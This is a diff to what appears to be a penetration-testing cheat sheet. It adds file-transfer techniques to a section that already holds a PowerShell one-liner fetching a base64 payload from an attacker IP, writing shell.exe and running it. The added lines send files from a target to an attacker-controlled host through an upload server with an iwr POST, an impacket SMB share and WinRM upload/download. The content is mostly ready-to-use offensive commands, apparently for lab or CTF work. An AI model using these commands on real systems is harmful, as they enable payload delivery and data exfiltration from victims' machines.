@@ -213,6 +213,29 @@ curl -s http://IP:9001/file.b64 | base64 -d > file.txt
 ```powershell
 powershell -c "$b64=(New-Object Net.WebClient).DownloadString('http://IP:9001/file.b64');[IO.File]::WriteAllBytes('shell.exe',[Convert]::FromBase64String($b64));Start-Process shell.exe"
 ```
+or
+attacker
+```shell
+python3 -m uploadserver 8001
+```
+target
+```shell
+iwr -Uri http://10.10.15.0:8001/upload -Method Post -InFile filehere
+```
+or
+attacker
+```shell
+impacket-smbserver share . -smb2support
+```
+target
+```shell
+copy 'fullfilepath' \\attackerip\share\
+```
+or via winrm directly upload/download
+```shell
+download filename
+upload filename
+```
 
 # Pivoting
 
